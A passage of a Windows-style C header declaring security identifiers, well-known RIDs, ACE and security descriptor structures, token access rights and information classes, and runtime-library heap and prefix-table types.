#define SECURITY_NETWORK_SERVICE_RID    (0x00000014L)
#define SECURITY_NT_NON_UNIQUE          (0x00000015L)
#define SECURITY_NT_NON_UNIQUE_SUB_AUTH_COUNT  (3L)
#define SECURITY_ENTERPRISE_READONLY_CONTROLLERS_RID (0x00000016L)

#define SECURITY_BUILTIN_DOMAIN_RID     (0x00000020L)
#define SECURITY_WRITE_RESTRICTED_CODE_RID (0x00000021L)


#define SECURITY_PACKAGE_BASE_RID       (0x00000040L)
#define SECURITY_PACKAGE_RID_COUNT      (2L)
#define SECURITY_PACKAGE_NTLM_RID       (0x0000000AL)
#define SECURITY_PACKAGE_SCHANNEL_RID   (0x0000000EL)
#define SECURITY_PACKAGE_DIGEST_RID     (0x00000015L)

#define SECURITY_CRED_TYPE_BASE_RID             (0x00000041L)
#define SECURITY_CRED_TYPE_RID_COUNT            (2L)
#define SECURITY_CRED_TYPE_THIS_ORG_CERT_RID    (0x00000001L)

#define SECURITY_MIN_BASE_RID		(0x00000050L)
#define SECURITY_SERVICE_ID_BASE_RID    (0x00000050L)
#define SECURITY_SERVICE_ID_RID_COUNT   (6L)
#define SECURITY_RESERVED_ID_BASE_RID   (0x00000051L)
#define SECURITY_APPPOOL_ID_BASE_RID    (0x00000052L)
#define SECURITY_APPPOOL_ID_RID_COUNT   (6L)
#define SECURITY_VIRTUALSERVER_ID_BASE_RID    (0x00000053L)
#define SECURITY_VIRTUALSERVER_ID_RID_COUNT   (6L)
#define SECURITY_USERMODEDRIVERHOST_ID_BASE_RID  (0x00000054L)
#define SECURITY_USERMODEDRIVERHOST_ID_RID_COUNT (6L)
#define SECURITY_CLOUD_INFRASTRUCTURE_SERVICES_ID_BASE_RID  (0x00000055L)
#define SECURITY_CLOUD_INFRASTRUCTURE_SERVICES_ID_RID_COUNT (6L)
#define SECURITY_WMIHOST_ID_BASE_RID  (0x00000056L)
#define SECURITY_WMIHOST_ID_RID_COUNT (6L)
#define SECURITY_TASK_ID_BASE_RID                 (0x00000057L)
#define SECURITY_NFS_ID_BASE_RID        (0x00000058L)
#define SECURITY_COM_ID_BASE_RID        (0x00000059L)
#define SECURITY_VIRTUALACCOUNT_ID_RID_COUNT   (6L)

#define SECURITY_MAX_BASE_RID		(0x0000006FL)

#define SECURITY_MAX_ALWAYS_FILTERED    (0x000003E7L)
#define SECURITY_MIN_NEVER_FILTERED     (0x000003E8L)

#define SECURITY_OTHER_ORGANIZATION_RID (0x000003E8L)

#define SECURITY_WINDOWSMOBILE_ID_BASE_RID (0x00000070L)

/* Well-known domain relative sub-authority values (RIDs) */

#define DOMAIN_GROUP_RID_ENTERPRISE_READONLY_DOMAIN_CONTROLLERS (0x000001F2L)

#define FOREST_USER_RID_MAX            (0x000001F3L)

/* Well-known users */

#define DOMAIN_USER_RID_ADMIN          (0x000001F4L)
#define DOMAIN_USER_RID_GUEST          (0x000001F5L)
#define DOMAIN_USER_RID_KRBTGT         (0x000001F6L)

#define DOMAIN_USER_RID_MAX            (0x000003E7L)

/* Well-known groups */

#define DOMAIN_GROUP_RID_ADMINS               (0x00000200L)
#define DOMAIN_GROUP_RID_USERS                (0x00000201L)
#define DOMAIN_GROUP_RID_GUESTS               (0x00000202L)
#define DOMAIN_GROUP_RID_COMPUTERS            (0x00000203L)
#define DOMAIN_GROUP_RID_CONTROLLERS          (0x00000204L)
#define DOMAIN_GROUP_RID_CERT_ADMINS          (0x00000205L)
#define DOMAIN_GROUP_RID_SCHEMA_ADMINS        (0x00000206L)
#define DOMAIN_GROUP_RID_ENTERPRISE_ADMINS    (0x00000207L)
#define DOMAIN_GROUP_RID_POLICY_ADMINS        (0x00000208L)
#define DOMAIN_GROUP_RID_READONLY_CONTROLLERS (0x00000209L)

/* Well-known aliases */

#define DOMAIN_ALIAS_RID_ADMINS                         (0x00000220L)
#define DOMAIN_ALIAS_RID_USERS                          (0x00000221L)
#define DOMAIN_ALIAS_RID_GUESTS                         (0x00000222L)
#define DOMAIN_ALIAS_RID_POWER_USERS                    (0x00000223L)

#define DOMAIN_ALIAS_RID_ACCOUNT_OPS                    (0x00000224L)
#define DOMAIN_ALIAS_RID_SYSTEM_OPS                     (0x00000225L)
#define DOMAIN_ALIAS_RID_PRINT_OPS                      (0x00000226L)
#define DOMAIN_ALIAS_RID_BACKUP_OPS                     (0x00000227L)

#define DOMAIN_ALIAS_RID_REPLICATOR                     (0x00000228L)
#define DOMAIN_ALIAS_RID_RAS_SERVERS                    (0x00000229L)
#define DOMAIN_ALIAS_RID_PREW2KCOMPACCESS               (0x0000022AL)
#define DOMAIN_ALIAS_RID_REMOTE_DESKTOP_USERS           (0x0000022BL)
#define DOMAIN_ALIAS_RID_NETWORK_CONFIGURATION_OPS      (0x0000022CL)
#define DOMAIN_ALIAS_RID_INCOMING_FOREST_TRUST_BUILDERS (0x0000022DL)

#define DOMAIN_ALIAS_RID_MONITORING_USERS               (0x0000022EL)
#define DOMAIN_ALIAS_RID_LOGGING_USERS                  (0x0000022FL)
#define DOMAIN_ALIAS_RID_AUTHORIZATIONACCESS            (0x00000230L)
#define DOMAIN_ALIAS_RID_TS_LICENSE_SERVERS             (0x00000231L)
#define DOMAIN_ALIAS_RID_DCOM_USERS                     (0x00000232L)
#define DOMAIN_ALIAS_RID_IUSERS                         (0x00000238L)
#define DOMAIN_ALIAS_RID_CRYPTO_OPERATORS               (0x00000239L)
#define DOMAIN_ALIAS_RID_CACHEABLE_PRINCIPALS_GROUP     (0x0000023BL)
#define DOMAIN_ALIAS_RID_NON_CACHEABLE_PRINCIPALS_GROUP (0x0000023CL)
#define DOMAIN_ALIAS_RID_EVENT_LOG_READERS_GROUP        (0x0000023DL)
#define DOMAIN_ALIAS_RID_CERTSVC_DCOM_ACCESS_GROUP      (0x0000023EL)

#define SECURITY_MANDATORY_LABEL_AUTHORITY          {0,0,0,0,0,16}
#define SECURITY_MANDATORY_UNTRUSTED_RID            (0x00000000L)
#define SECURITY_MANDATORY_LOW_RID                  (0x00001000L)
#define SECURITY_MANDATORY_MEDIUM_RID               (0x00002000L)
#define SECURITY_MANDATORY_HIGH_RID                 (0x00003000L)
#define SECURITY_MANDATORY_SYSTEM_RID               (0x00004000L)
#define SECURITY_MANDATORY_PROTECTED_PROCESS_RID    (0x00005000L)

/* SECURITY_MANDATORY_MAXIMUM_USER_RID is the highest RID that
   can be set by a usermode caller.*/

#define SECURITY_MANDATORY_MAXIMUM_USER_RID   SECURITY_MANDATORY_SYSTEM_RID

#define MANDATORY_LEVEL_TO_MANDATORY_RID(IL) (IL * 0x1000)

/* Allocate the System Luid.  The first 1000 LUIDs are reserved.
   Use #999 here (0x3e7 = 999) */

#define SYSTEM_LUID                     {0x3e7, 0x0}
#define ANONYMOUS_LOGON_LUID            {0x3e6, 0x0}
#define LOCALSERVICE_LUID               {0x3e5, 0x0}
#define NETWORKSERVICE_LUID             {0x3e4, 0x0}
#define IUSER_LUID                      {0x3e3, 0x0}

typedef struct _ACE_HEADER {
  UCHAR AceType;
  UCHAR AceFlags;
  USHORT AceSize;
} ACE_HEADER, *PACE_HEADER;

/* also in winnt.h */
#define ACCESS_MIN_MS_ACE_TYPE                  (0x0)
#define ACCESS_ALLOWED_ACE_TYPE                 (0x0)
#define ACCESS_DENIED_ACE_TYPE                  (0x1)
#define SYSTEM_AUDIT_ACE_TYPE                   (0x2)
#define SYSTEM_ALARM_ACE_TYPE                   (0x3)
#define ACCESS_MAX_MS_V2_ACE_TYPE               (0x3)
#define ACCESS_ALLOWED_COMPOUND_ACE_TYPE        (0x4)
#define ACCESS_MAX_MS_V3_ACE_TYPE               (0x4)
#define ACCESS_MIN_MS_OBJECT_ACE_TYPE           (0x5)
#define ACCESS_ALLOWED_OBJECT_ACE_TYPE          (0x5)
#define ACCESS_DENIED_OBJECT_ACE_TYPE           (0x6)
#define SYSTEM_AUDIT_OBJECT_ACE_TYPE            (0x7)
#define SYSTEM_ALARM_OBJECT_ACE_TYPE            (0x8)
#define ACCESS_MAX_MS_OBJECT_ACE_TYPE           (0x8)
#define ACCESS_MAX_MS_V4_ACE_TYPE               (0x8)
#define ACCESS_MAX_MS_ACE_TYPE                  (0x8)
#define ACCESS_ALLOWED_CALLBACK_ACE_TYPE        (0x9)
#define ACCESS_DENIED_CALLBACK_ACE_TYPE         (0xA)
#define ACCESS_ALLOWED_CALLBACK_OBJECT_ACE_TYPE (0xB)
#define ACCESS_DENIED_CALLBACK_OBJECT_ACE_TYPE  (0xC)
#define SYSTEM_AUDIT_CALLBACK_ACE_TYPE          (0xD)
#define SYSTEM_ALARM_CALLBACK_ACE_TYPE          (0xE)
#define SYSTEM_AUDIT_CALLBACK_OBJECT_ACE_TYPE   (0xF)
#define SYSTEM_ALARM_CALLBACK_OBJECT_ACE_TYPE   (0x10)
#define ACCESS_MAX_MS_V5_ACE_TYPE               (0x11)
#define SYSTEM_MANDATORY_LABEL_ACE_TYPE         (0x11)

/* The following are the inherit flags that go into the AceFlags field
   of an Ace header. */

#define OBJECT_INHERIT_ACE                (0x1)
#define CONTAINER_INHERIT_ACE             (0x2)
#define NO_PROPAGATE_INHERIT_ACE          (0x4)
#define INHERIT_ONLY_ACE                  (0x8)
#define INHERITED_ACE                     (0x10)
#define VALID_INHERIT_FLAGS               (0x1F)

#define SUCCESSFUL_ACCESS_ACE_FLAG        (0x40)
#define FAILED_ACCESS_ACE_FLAG            (0x80)

typedef struct _ACCESS_ALLOWED_ACE {
  ACE_HEADER Header;
  ACCESS_MASK Mask;
  ULONG SidStart;
} ACCESS_ALLOWED_ACE, *PACCESS_ALLOWED_ACE;

typedef struct _ACCESS_DENIED_ACE {
  ACE_HEADER Header;
  ACCESS_MASK Mask;
  ULONG SidStart;
} ACCESS_DENIED_ACE, *PACCESS_DENIED_ACE;

typedef struct _SYSTEM_AUDIT_ACE {
  ACE_HEADER Header;
  ACCESS_MASK Mask;
  ULONG SidStart;
} SYSTEM_AUDIT_ACE, *PSYSTEM_AUDIT_ACE;

typedef struct _SYSTEM_ALARM_ACE {
  ACE_HEADER Header;
  ACCESS_MASK Mask;
  ULONG SidStart;
} SYSTEM_ALARM_ACE, *PSYSTEM_ALARM_ACE;

typedef struct _SYSTEM_MANDATORY_LABEL_ACE {
  ACE_HEADER Header;
  ACCESS_MASK Mask;
  ULONG SidStart;
} SYSTEM_MANDATORY_LABEL_ACE, *PSYSTEM_MANDATORY_LABEL_ACE;

#define SYSTEM_MANDATORY_LABEL_NO_WRITE_UP         0x1
#define SYSTEM_MANDATORY_LABEL_NO_READ_UP          0x2
#define SYSTEM_MANDATORY_LABEL_NO_EXECUTE_UP       0x4
#define SYSTEM_MANDATORY_LABEL_VALID_MASK (SYSTEM_MANDATORY_LABEL_NO_WRITE_UP   | \
                                           SYSTEM_MANDATORY_LABEL_NO_READ_UP    | \
                                           SYSTEM_MANDATORY_LABEL_NO_EXECUTE_UP)

#define SECURITY_DESCRIPTOR_MIN_LENGTH   (sizeof(SECURITY_DESCRIPTOR))

typedef USHORT SECURITY_DESCRIPTOR_CONTROL,*PSECURITY_DESCRIPTOR_CONTROL;

#define SE_OWNER_DEFAULTED              0x0001
#define SE_GROUP_DEFAULTED              0x0002
#define SE_DACL_PRESENT                 0x0004
#define SE_DACL_DEFAULTED               0x0008
#define SE_SACL_PRESENT                 0x0010
#define SE_SACL_DEFAULTED               0x0020
#define SE_DACL_UNTRUSTED               0x0040
#define SE_SERVER_SECURITY              0x0080
#define SE_DACL_AUTO_INHERIT_REQ        0x0100
#define SE_SACL_AUTO_INHERIT_REQ        0x0200
#define SE_DACL_AUTO_INHERITED          0x0400
#define SE_SACL_AUTO_INHERITED          0x0800
#define SE_DACL_PROTECTED               0x1000
#define SE_SACL_PROTECTED               0x2000
#define SE_RM_CONTROL_VALID             0x4000
#define SE_SELF_RELATIVE                0x8000

typedef struct _SECURITY_DESCRIPTOR_RELATIVE {
  UCHAR Revision;
  UCHAR Sbz1;
  SECURITY_DESCRIPTOR_CONTROL Control;
  ULONG Owner;
  ULONG Group;
  ULONG Sacl;
  ULONG Dacl;
} SECURITY_DESCRIPTOR_RELATIVE, *PISECURITY_DESCRIPTOR_RELATIVE;

typedef struct _SECURITY_DESCRIPTOR {
  UCHAR Revision;
  UCHAR Sbz1;
  SECURITY_DESCRIPTOR_CONTROL Control;
  PSID Owner;
  PSID Group;
  PACL Sacl;
  PACL Dacl;
} SECURITY_DESCRIPTOR, *PISECURITY_DESCRIPTOR;

typedef struct _OBJECT_TYPE_LIST {
  USHORT Level;
  USHORT Sbz;
  GUID *ObjectType;
} OBJECT_TYPE_LIST, *POBJECT_TYPE_LIST;

#define ACCESS_OBJECT_GUID       0
#define ACCESS_PROPERTY_SET_GUID 1
#define ACCESS_PROPERTY_GUID     2
#define ACCESS_MAX_LEVEL         4

typedef enum _AUDIT_EVENT_TYPE {
  AuditEventObjectAccess,
  AuditEventDirectoryServiceAccess
} AUDIT_EVENT_TYPE, *PAUDIT_EVENT_TYPE;

#define AUDIT_ALLOW_NO_PRIVILEGE 0x1

#define ACCESS_DS_SOURCE_A "DS"
#define ACCESS_DS_SOURCE_W L"DS"
#define ACCESS_DS_OBJECT_TYPE_NAME_A "Directory Service Object"
#define ACCESS_DS_OBJECT_TYPE_NAME_W L"Directory Service Object"

#define ACCESS_REASON_TYPE_MASK 0xffff0000
#define ACCESS_REASON_DATA_MASK 0x0000ffff

typedef enum _ACCESS_REASON_TYPE {
  AccessReasonNone = 0x00000000,
  AccessReasonAllowedAce = 0x00010000,
  AccessReasonDeniedAce = 0x00020000,
  AccessReasonAllowedParentAce = 0x00030000,
  AccessReasonDeniedParentAce = 0x00040000,
  AccessReasonMissingPrivilege = 0x00100000,
  AccessReasonFromPrivilege = 0x00200000,
  AccessReasonIntegrityLevel = 0x00300000,
  AccessReasonOwnership = 0x00400000,
  AccessReasonNullDacl = 0x00500000,
  AccessReasonEmptyDacl = 0x00600000,
  AccessReasonNoSD = 0x00700000,
  AccessReasonNoGrant = 0x00800000
} ACCESS_REASON_TYPE;

typedef ULONG ACCESS_REASON;

typedef struct _ACCESS_REASONS {
  ACCESS_REASON Data[32];
} ACCESS_REASONS, *PACCESS_REASONS;

#define SE_SECURITY_DESCRIPTOR_FLAG_NO_OWNER_ACE    0x00000001
#define SE_SECURITY_DESCRIPTOR_FLAG_NO_LABEL_ACE    0x00000002
#define SE_SECURITY_DESCRIPTOR_VALID_FLAGS          0x00000003

typedef struct _SE_SECURITY_DESCRIPTOR {
  ULONG Size;
  ULONG Flags;
  PSECURITY_DESCRIPTOR SecurityDescriptor;
} SE_SECURITY_DESCRIPTOR, *PSE_SECURITY_DESCRIPTOR;

typedef struct _SE_ACCESS_REQUEST {
  ULONG Size;
  PSE_SECURITY_DESCRIPTOR SeSecurityDescriptor;
  ACCESS_MASK DesiredAccess;
  ACCESS_MASK PreviouslyGrantedAccess;
  PSID PrincipalSelfSid;
  PGENERIC_MAPPING GenericMapping;
  ULONG ObjectTypeListCount;
  POBJECT_TYPE_LIST ObjectTypeList;
} SE_ACCESS_REQUEST, *PSE_ACCESS_REQUEST;

typedef struct _SE_ACCESS_REPLY {
  ULONG Size;
  ULONG ResultListCount;
  PACCESS_MASK GrantedAccess;
  PNTSTATUS AccessStatus;
  PACCESS_REASONS AccessReason;
  PPRIVILEGE_SET* Privileges;
} SE_ACCESS_REPLY, *PSE_ACCESS_REPLY;

typedef enum _SE_AUDIT_OPERATION {
  AuditPrivilegeObject,
  AuditPrivilegeService,
  AuditAccessCheck,
  AuditOpenObject,
  AuditOpenObjectWithTransaction,
  AuditCloseObject,
  AuditDeleteObject,
  AuditOpenObjectForDelete,
  AuditOpenObjectForDeleteWithTransaction,
  AuditCloseNonObject,
  AuditOpenNonObject,
  AuditObjectReference,
  AuditHandleCreation,
} SE_AUDIT_OPERATION, *PSE_AUDIT_OPERATION;

typedef struct _SE_AUDIT_INFO {
  ULONG Size;
  AUDIT_EVENT_TYPE AuditType;
  SE_AUDIT_OPERATION AuditOperation;
  ULONG AuditFlags;
  UNICODE_STRING SubsystemName;
  UNICODE_STRING ObjectTypeName;
  UNICODE_STRING ObjectName;
  PVOID HandleId;
  GUID* TransactionId;
  LUID* OperationId;
  BOOLEAN ObjectCreation;
  BOOLEAN GenerateOnClose;
} SE_AUDIT_INFO, *PSE_AUDIT_INFO;

#define TOKEN_ASSIGN_PRIMARY            (0x0001)
#define TOKEN_DUPLICATE                 (0x0002)
#define TOKEN_IMPERSONATE               (0x0004)
#define TOKEN_QUERY                     (0x0008)
#define TOKEN_QUERY_SOURCE              (0x0010)
#define TOKEN_ADJUST_PRIVILEGES         (0x0020)
#define TOKEN_ADJUST_GROUPS             (0x0040)
#define TOKEN_ADJUST_DEFAULT            (0x0080)
#define TOKEN_ADJUST_SESSIONID          (0x0100)

#define TOKEN_ALL_ACCESS_P (STANDARD_RIGHTS_REQUIRED  |\
                            TOKEN_ASSIGN_PRIMARY      |\
                            TOKEN_DUPLICATE           |\
                            TOKEN_IMPERSONATE         |\
                            TOKEN_QUERY               |\
                            TOKEN_QUERY_SOURCE        |\
                            TOKEN_ADJUST_PRIVILEGES   |\
                            TOKEN_ADJUST_GROUPS       |\
                            TOKEN_ADJUST_DEFAULT )

#if ((defined(_WIN32_WINNT) && (_WIN32_WINNT > 0x0400)) || (!defined(_WIN32_WINNT)))
#define TOKEN_ALL_ACCESS  (TOKEN_ALL_ACCESS_P |\
                           TOKEN_ADJUST_SESSIONID )
#else
#define TOKEN_ALL_ACCESS  (TOKEN_ALL_ACCESS_P)
#endif

#define TOKEN_READ       (STANDARD_RIGHTS_READ     |\
                          TOKEN_QUERY)

#define TOKEN_WRITE      (STANDARD_RIGHTS_WRITE    |\
                          TOKEN_ADJUST_PRIVILEGES  |\
                          TOKEN_ADJUST_GROUPS      |\
                          TOKEN_ADJUST_DEFAULT)

#define TOKEN_EXECUTE    (STANDARD_RIGHTS_EXECUTE)

typedef enum _TOKEN_TYPE {
  TokenPrimary = 1,
  TokenImpersonation
} TOKEN_TYPE,*PTOKEN_TYPE;

typedef enum _TOKEN_INFORMATION_CLASS {
  TokenUser = 1,
  TokenGroups,
  TokenPrivileges,
  TokenOwner,
  TokenPrimaryGroup,
  TokenDefaultDacl,
  TokenSource,
  TokenType,
  TokenImpersonationLevel,
  TokenStatistics,
  TokenRestrictedSids,
  TokenSessionId,
  TokenGroupsAndPrivileges,
  TokenSessionReference,
  TokenSandBoxInert,
  TokenAuditPolicy,
  TokenOrigin,
  TokenElevationType,
  TokenLinkedToken,
  TokenElevation,
  TokenHasRestrictions,
  TokenAccessInformation,
  TokenVirtualizationAllowed,
  TokenVirtualizationEnabled,
  TokenIntegrityLevel,
  TokenUIAccess,
  TokenMandatoryPolicy,
  TokenLogonSid,
  MaxTokenInfoClass
} TOKEN_INFORMATION_CLASS, *PTOKEN_INFORMATION_CLASS;

typedef struct _TOKEN_USER {
  SID_AND_ATTRIBUTES User;
} TOKEN_USER, *PTOKEN_USER;

typedef struct _TOKEN_GROUPS {
  ULONG GroupCount;
  SID_AND_ATTRIBUTES Groups[ANYSIZE_ARRAY];
} TOKEN_GROUPS,*PTOKEN_GROUPS,*LPTOKEN_GROUPS;

typedef struct _TOKEN_PRIVILEGES {
  ULONG PrivilegeCount;
  LUID_AND_ATTRIBUTES Privileges[ANYSIZE_ARRAY];
} TOKEN_PRIVILEGES,*PTOKEN_PRIVILEGES,*LPTOKEN_PRIVILEGES;

typedef struct _TOKEN_OWNER {
  PSID Owner;
} TOKEN_OWNER,*PTOKEN_OWNER;

typedef struct _TOKEN_PRIMARY_GROUP {
  PSID PrimaryGroup;
} TOKEN_PRIMARY_GROUP,*PTOKEN_PRIMARY_GROUP;

typedef struct _TOKEN_DEFAULT_DACL {
  PACL DefaultDacl;
} TOKEN_DEFAULT_DACL,*PTOKEN_DEFAULT_DACL;

typedef struct _TOKEN_GROUPS_AND_PRIVILEGES {
  ULONG SidCount;
  ULONG SidLength;
  PSID_AND_ATTRIBUTES Sids;
  ULONG RestrictedSidCount;
  ULONG RestrictedSidLength;
  PSID_AND_ATTRIBUTES RestrictedSids;
  ULONG PrivilegeCount;
  ULONG PrivilegeLength;
  PLUID_AND_ATTRIBUTES Privileges;
  LUID AuthenticationId;
} TOKEN_GROUPS_AND_PRIVILEGES, *PTOKEN_GROUPS_AND_PRIVILEGES;

typedef struct _TOKEN_LINKED_TOKEN {
  HANDLE LinkedToken;
} TOKEN_LINKED_TOKEN, *PTOKEN_LINKED_TOKEN;

typedef struct _TOKEN_ELEVATION {
  ULONG TokenIsElevated;
} TOKEN_ELEVATION, *PTOKEN_ELEVATION;

typedef struct _TOKEN_MANDATORY_LABEL {
  SID_AND_ATTRIBUTES Label;
} TOKEN_MANDATORY_LABEL, *PTOKEN_MANDATORY_LABEL;

#define TOKEN_MANDATORY_POLICY_OFF             0x0
#define TOKEN_MANDATORY_POLICY_NO_WRITE_UP     0x1
#define TOKEN_MANDATORY_POLICY_NEW_PROCESS_MIN 0x2

#define TOKEN_MANDATORY_POLICY_VALID_MASK    (TOKEN_MANDATORY_POLICY_NO_WRITE_UP | \
                                              TOKEN_MANDATORY_POLICY_NEW_PROCESS_MIN)

typedef struct _TOKEN_MANDATORY_POLICY {
  ULONG Policy;
} TOKEN_MANDATORY_POLICY, *PTOKEN_MANDATORY_POLICY;

typedef struct _TOKEN_ACCESS_INFORMATION {
  PSID_AND_ATTRIBUTES_HASH SidHash;
  PSID_AND_ATTRIBUTES_HASH RestrictedSidHash;
  PTOKEN_PRIVILEGES Privileges;
  LUID AuthenticationId;
  TOKEN_TYPE TokenType;
  SECURITY_IMPERSONATION_LEVEL ImpersonationLevel;
  TOKEN_MANDATORY_POLICY MandatoryPolicy;
  ULONG Flags;
} TOKEN_ACCESS_INFORMATION, *PTOKEN_ACCESS_INFORMATION;

#define POLICY_AUDIT_SUBCATEGORY_COUNT (53)

typedef struct _TOKEN_AUDIT_POLICY {
  UCHAR PerUserPolicy[((POLICY_AUDIT_SUBCATEGORY_COUNT) >> 1) + 1];
} TOKEN_AUDIT_POLICY, *PTOKEN_AUDIT_POLICY;

#define TOKEN_SOURCE_LENGTH 8

typedef struct _TOKEN_SOURCE {
  CHAR SourceName[TOKEN_SOURCE_LENGTH];
  LUID SourceIdentifier;
} TOKEN_SOURCE,*PTOKEN_SOURCE;

typedef struct _TOKEN_STATISTICS {
  LUID TokenId;
  LUID AuthenticationId;
  LARGE_INTEGER ExpirationTime;
  TOKEN_TYPE TokenType;
  SECURITY_IMPERSONATION_LEVEL ImpersonationLevel;
  ULONG DynamicCharged;
  ULONG DynamicAvailable;
  ULONG GroupCount;
  ULONG PrivilegeCount;
  LUID ModifiedId;
} TOKEN_STATISTICS, *PTOKEN_STATISTICS;

typedef struct _TOKEN_CONTROL {
  LUID TokenId;
  LUID AuthenticationId;
  LUID ModifiedId;
  TOKEN_SOURCE TokenSource;
} TOKEN_CONTROL,*PTOKEN_CONTROL;

typedef struct _TOKEN_ORIGIN {
  LUID OriginatingLogonSession;
} TOKEN_ORIGIN, *PTOKEN_ORIGIN;

typedef enum _MANDATORY_LEVEL {
  MandatoryLevelUntrusted = 0,
  MandatoryLevelLow,
  MandatoryLevelMedium,
  MandatoryLevelHigh,
  MandatoryLevelSystem,
  MandatoryLevelSecureProcess,
  MandatoryLevelCount
} MANDATORY_LEVEL, *PMANDATORY_LEVEL;

#define TOKEN_HAS_TRAVERSE_PRIVILEGE    0x0001
#define TOKEN_HAS_BACKUP_PRIVILEGE      0x0002
#define TOKEN_HAS_RESTORE_PRIVILEGE     0x0004
#define TOKEN_WRITE_RESTRICTED          0x0008
#define TOKEN_IS_RESTRICTED             0x0010
#define TOKEN_SESSION_NOT_REFERENCED    0x0020
#define TOKEN_SANDBOX_INERT             0x0040
#define TOKEN_HAS_IMPERSONATE_PRIVILEGE 0x0080
#define SE_BACKUP_PRIVILEGES_CHECKED    0x0100
#define TOKEN_VIRTUALIZE_ALLOWED        0x0200
#define TOKEN_VIRTUALIZE_ENABLED        0x0400
#define TOKEN_IS_FILTERED               0x0800
#define TOKEN_UIACCESS                  0x1000
#define TOKEN_NOT_LOW                   0x2000

typedef struct _SE_EXPORTS {
  LUID SeCreateTokenPrivilege;
  LUID SeAssignPrimaryTokenPrivilege;
  LUID SeLockMemoryPrivilege;
  LUID SeIncreaseQuotaPrivilege;
  LUID SeUnsolicitedInputPrivilege;
  LUID SeTcbPrivilege;
  LUID SeSecurityPrivilege;
  LUID SeTakeOwnershipPrivilege;
  LUID SeLoadDriverPrivilege;
  LUID SeCreatePagefilePrivilege;
  LUID SeIncreaseBasePriorityPrivilege;
  LUID SeSystemProfilePrivilege;
  LUID SeSystemtimePrivilege;
  LUID SeProfileSingleProcessPrivilege;
  LUID SeCreatePermanentPrivilege;
  LUID SeBackupPrivilege;
  LUID SeRestorePrivilege;
  LUID SeShutdownPrivilege;
  LUID SeDebugPrivilege;
  LUID SeAuditPrivilege;
  LUID SeSystemEnvironmentPrivilege;
  LUID SeChangeNotifyPrivilege;
  LUID SeRemoteShutdownPrivilege;
  PSID SeNullSid;
  PSID SeWorldSid;
  PSID SeLocalSid;
  PSID SeCreatorOwnerSid;
  PSID SeCreatorGroupSid;
  PSID SeNtAuthoritySid;
  PSID SeDialupSid;
  PSID SeNetworkSid;
  PSID SeBatchSid;
  PSID SeInteractiveSid;
  PSID SeLocalSystemSid;
  PSID SeAliasAdminsSid;
  PSID SeAliasUsersSid;
  PSID SeAliasGuestsSid;
  PSID SeAliasPowerUsersSid;
  PSID SeAliasAccountOpsSid;
  PSID SeAliasSystemOpsSid;
  PSID SeAliasPrintOpsSid;
  PSID SeAliasBackupOpsSid;
  PSID SeAuthenticatedUsersSid;
  PSID SeRestrictedSid;
  PSID SeAnonymousLogonSid;
  LUID SeUndockPrivilege;
  LUID SeSyncAgentPrivilege;
  LUID SeEnableDelegationPrivilege;
  PSID SeLocalServiceSid;
  PSID SeNetworkServiceSid;
  LUID SeManageVolumePrivilege;
  LUID SeImpersonatePrivilege;
  LUID SeCreateGlobalPrivilege;
  LUID SeTrustedCredManAccessPrivilege;
  LUID SeRelabelPrivilege;
  LUID SeIncreaseWorkingSetPrivilege;
  LUID SeTimeZonePrivilege;
  LUID SeCreateSymbolicLinkPrivilege;
  PSID SeIUserSid;
  PSID SeUntrustedMandatorySid;
  PSID SeLowMandatorySid;
  PSID SeMediumMandatorySid;
  PSID SeHighMandatorySid;
  PSID SeSystemMandatorySid;
  PSID SeOwnerRightsSid;
} SE_EXPORTS, *PSE_EXPORTS;

typedef NTSTATUS
(NTAPI *PSE_LOGON_SESSION_TERMINATED_ROUTINE)(
  IN PLUID LogonId);
/******************************************************************************
 *                           Runtime Library Types                            *
 ******************************************************************************/


#define RTL_SYSTEM_VOLUME_INFORMATION_FOLDER    L"System Volume Information"

typedef PVOID
(NTAPI *PRTL_ALLOCATE_STRING_ROUTINE)(
  IN SIZE_T NumberOfBytes);

#if _WIN32_WINNT >= 0x0600
typedef PVOID
(NTAPI *PRTL_REALLOCATE_STRING_ROUTINE)(
  IN SIZE_T NumberOfBytes,
  IN PVOID Buffer);
#endif

typedef VOID
(NTAPI *PRTL_FREE_STRING_ROUTINE)(
  IN PVOID Buffer);

extern const PRTL_ALLOCATE_STRING_ROUTINE RtlAllocateStringRoutine;
extern const PRTL_FREE_STRING_ROUTINE RtlFreeStringRoutine;

#if _WIN32_WINNT >= 0x0600
extern const PRTL_REALLOCATE_STRING_ROUTINE RtlReallocateStringRoutine;
#endif

typedef NTSTATUS
(NTAPI * PRTL_HEAP_COMMIT_ROUTINE) (
  IN PVOID Base,
  IN OUT PVOID *CommitAddress,
  IN OUT PSIZE_T CommitSize);

typedef struct _RTL_HEAP_PARAMETERS {
  ULONG Length;
  SIZE_T SegmentReserve;
  SIZE_T SegmentCommit;
  SIZE_T DeCommitFreeBlockThreshold;
  SIZE_T DeCommitTotalFreeThreshold;
  SIZE_T MaximumAllocationSize;
  SIZE_T VirtualMemoryThreshold;
  SIZE_T InitialCommit;
  SIZE_T InitialReserve;
  PRTL_HEAP_COMMIT_ROUTINE CommitRoutine;
  SIZE_T Reserved[2];
} RTL_HEAP_PARAMETERS, *PRTL_HEAP_PARAMETERS;

#if (NTDDI_VERSION >= NTDDI_WIN2K)

typedef struct _GENERATE_NAME_CONTEXT {
  USHORT Checksum;
  BOOLEAN CheckSumInserted;
  UCHAR NameLength;
  WCHAR NameBuffer[8];
  ULONG ExtensionLength;
  WCHAR ExtensionBuffer[4];
  ULONG LastIndexValue;
} GENERATE_NAME_CONTEXT, *PGENERATE_NAME_CONTEXT;

typedef struct _PREFIX_TABLE_ENTRY {
  CSHORT NodeTypeCode;
  CSHORT NameLength;
  struct _PREFIX_TABLE_ENTRY *NextPrefixTree;
  RTL_SPLAY_LINKS Links;
  PSTRING Prefix;
} PREFIX_TABLE_ENTRY, *PPREFIX_TABLE_ENTRY;

typedef struct _PREFIX_TABLE {
  CSHORT NodeTypeCode;
  CSHORT NameLength;
  PPREFIX_TABLE_ENTRY NextPrefixTree;
} PREFIX_TABLE, *PPREFIX_TABLE;

typedef struct _UNICODE_PREFIX_TABLE_ENTRY {
  CSHORT NodeTypeCode;
  CSHORT NameLength;
  struct _UNICODE_PREFIX_TABLE_ENTRY *NextPrefixTree;
  struct _UNICODE_PREFIX_TABLE_ENTRY *CaseMatch;
  RTL_SPLAY_LINKS Links;
  PUNICODE_STRING Prefix;
} UNICODE_PREFIX_TABLE_ENTRY, *PUNICODE_PREFIX_TABLE_ENTRY;

typedef struct _UNICODE_PREFIX_TABLE {
  CSHORT NodeTypeCode;
  CSHORT NameLength;
